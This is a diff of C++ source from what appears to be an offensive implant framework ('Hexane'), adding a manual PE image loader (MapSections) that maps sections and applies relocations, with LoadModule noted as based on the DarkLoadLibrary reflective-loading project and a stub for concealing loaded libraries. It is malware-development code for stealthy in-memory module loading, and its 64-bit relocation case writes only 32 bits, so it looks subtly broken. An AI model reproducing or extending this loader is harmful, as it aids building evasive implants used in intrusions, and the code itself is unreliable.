@@ -36,16 +36,15 @@ namespace Memory {
             return object;
         }
 
-        PEXECUTABLE CreateImage(UINT8 *data) {
+        PEXECUTABLE CreateImage(uint8 *data) {
             HEXANE;
 
             auto image = (EXECUTABLE*) Malloc(sizeof(_executable));
 
             image->buffer   = data;
-            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(data) + ((PIMAGE_DOS_HEADER) data)->e_lfanew);
-            image->exports  = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(data) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-            image->symbols  = (_coff_symbol*) (B_PTR(data) + image->nt_head->FileHeader.PointerToSymbolTable);
-        	image->section	= IMAGE_FIRST_SECTION(image->nt_head);
+            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(image->buffer) + ((PIMAGE_DOS_HEADER) data)->e_lfanew);
+            image->symbols  = (PCOFF_SYMBOL) (B_PTR(image->buffer) + image->nt_head->FileHeader.PointerToSymbolTable);
+            image->exports  = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(image->buffer) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
             return image;
         }
@@ -176,7 +175,7 @@ namespace Memory {
 		    return symbol;
 	    }
 
-	    BOOL ParseFileName(EXECUTABLE *module, WCHAR *filename) {
+	    BOOL FindModule(EXECUTABLE *module, WCHAR *filename) {
 	    	HEXANE;
 
 		    if (!filename) {
@@ -196,7 +195,7 @@ namespace Memory {
 		    return TRUE;
 	    }
 
-	    BOOL ReadFileToBuffer(PEXECUTABLE module) {
+	    BOOL ReadModule(PEXECUTABLE module) {
 	    	HEXANE;
 
 		    HANDLE handle = ctx->ioapi.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
@@ -225,6 +224,65 @@ namespace Memory {
 		    return TRUE;
 	    }
 
+	    BOOL MapSections(PEXECUTABLE module) {
+		    HEXANE;
+
+		    auto region_size		= (SIZE_T)module->nt_head->OptionalHeader.SizeOfImage;
+		    const auto pre_base		= module->nt_head->OptionalHeader.ImageBase;
+
+		    module->base = pre_base;
+
+		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
+			    module->base != pre_base) {
+
+			    module->base	= 0;
+			    region_size		= module->nt_head->OptionalHeader.SizeOfImage;
+
+			    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
+				    return false;
+			    }
+		    }
+
+		    for (auto i = 0; i < module->nt_head->OptionalHeader.SizeOfHeaders; i++) {
+			    B_PTR(module->base)[i] = module->buffer[i];
+		    }
+
+		    for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
+			    for (auto j = 0; j < module->section->SizeOfRawData; j++) {
+				    (B_PTR(module->base + module->section->VirtualAddress))[j] = (module->buffer + module->section->PointerToRawData)[j];
+			    }
+		    }
+
+		    UINT_PTR base_offset = module->base - pre_base;
+		    PIMAGE_DATA_DIRECTORY relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+		    // if non-zero rva and relocdir exists...
+		    if ((module->base - pre_base) && relocdir) {
+			    PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);
+
+			    do {
+				    PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY)reloc + 1;
+
+				    do {
+					    switch (head->Type) {
+					    case IMAGE_REL_BASED_DIR64:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
+					    case IMAGE_REL_BASED_HIGHLOW:	*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_offset; break;
+					    case IMAGE_REL_BASED_HIGH:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
+					    case IMAGE_REL_BASED_LOW:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
+					    }
+					    head++;
+				    }
+				    while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);
+
+				    reloc = (PIMAGE_BASE_RELOCATION)head;
+			    }
+			    while (reloc->VirtualAddress);
+		    }
+
+		    module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
+		    return true;
+	    }
+
 	    PEXECUTABLE LoadModule(CONST UINT32 load_type, WCHAR *filename, UINT8 *memory, CONST UINT32 mem_size, WCHAR *name) {
 	    	// NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
 	    	// TODO: see if this can be used on bofs
@@ -240,7 +298,7 @@ namespace Memory {
 
 		    switch (LOWORD(load_type)) {
 		    	case LoadLocalFile:
-				    if (!ParseFileName(module, filename) || !ReadFileToBuffer(module)) {
+				    if (!FindModule(module, filename) || !ReadModule(module)) {
 					    goto defer;
 				    }
 				    break;
@@ -305,6 +363,7 @@ namespace Memory {
 	    defer:
 		    return module;
 	    }
+
 
 	    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
 		    return FALSE;
